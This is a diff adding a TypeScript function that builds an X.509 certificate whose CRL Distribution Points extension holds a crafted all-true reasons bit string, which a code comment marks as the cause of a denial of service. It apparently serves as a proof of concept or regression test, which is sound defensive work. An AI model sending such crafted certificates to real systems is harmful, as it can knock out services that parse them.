@@ -1,0 +1,110 @@
+import * as x500 from "x500-ts";
+import * as asn1 from "asn1-ts";
+
+export default
+function generateCertificate (): Uint8Array {
+    const issuerCN = "Mr. Issuer";
+    const subjectCN = "Mr. Subject";
+
+    const issuer = new asn1.DERElement(
+        asn1.ASN1TagClass.universal,
+        asn1.ASN1Construction.primitive,
+        asn1.ASN1UniversalType.utf8String,
+    );
+    issuer.utf8String = issuerCN;
+
+    const subject = new asn1.DERElement(
+        asn1.ASN1TagClass.universal,
+        asn1.ASN1Construction.primitive,
+        asn1.ASN1UniversalType.utf8String,
+    );
+    subject.utf8String = subjectCN;
+
+    const reasons = new asn1.DERElement(
+        asn1.ASN1TagClass.context,
+        asn1.ASN1Construction.primitive,
+        1,
+    );
+    reasons.bitString = [
+        true,
+        true,
+        true,
+        true,
+        true,
+        true,
+        true,
+    ];
+
+    const cert: x500.Certificate = new x500.Certificate(
+        new x500.TBSCertificate(
+            2,
+            new Uint8Array([ 0x01, 0x02, 0x03, 0x04 ]),
+            new x500.AlgorithmIdentifier(
+                new asn1.ObjectIdentifier([ 1, 2, 3, 4 ]),
+                new asn1.DERElement(
+                    asn1.ASN1TagClass.universal,
+                    asn1.ASN1Construction.primitive,
+                    asn1.ASN1UniversalType.nill,
+                ),
+            ),
+            [
+                [
+                    new x500.AttributeTypeAndValue(
+                        new asn1.ObjectIdentifier([ 2, 5, 4, 3 ]), // commonName
+                        issuer,
+                    ),
+                ],
+            ],
+            new x500.Validity(
+                new Date(),
+                new Date(),
+            ),
+            [
+                [
+                    new x500.AttributeTypeAndValue(
+                        new asn1.ObjectIdentifier([ 2, 5, 4, 3 ]), // commonName
+                        subject,
+                    ),
+                ],
+            ],
+            new x500.SubjectPublicKeyInfo(
+                new x500.AlgorithmIdentifier(
+                    new asn1.ObjectIdentifier([ 1, 2, 3, 4 ]),
+                    new asn1.DERElement(
+                        asn1.ASN1TagClass.universal,
+                        asn1.ASN1Construction.primitive,
+                        asn1.ASN1UniversalType.nill,
+                    ),
+                ),
+                [],
+            ),
+            undefined,
+            undefined,
+            [
+                /**
+                 * This is the extension that causes the DoS.
+                 */
+                new x500.Extension(
+                    new asn1.ObjectIdentifier([ 2, 5, 29, 31 ]),
+                    false,
+                    (asn1.DERElement.fromSequence([
+                        asn1.DERElement.fromSequence([
+                            reasons,
+                        ]),
+                    ])).toBytes(),
+                ),
+            ],
+        ),
+        new x500.AlgorithmIdentifier(
+            new asn1.ObjectIdentifier([ 1, 2, 3, 4 ]),
+            new asn1.DERElement(
+                asn1.ASN1TagClass.universal,
+                asn1.ASN1Construction.primitive,
+                asn1.ASN1UniversalType.nill,
+            ),
+        ),
+        [],
+    );
+
+    return cert.toBytes();
+}
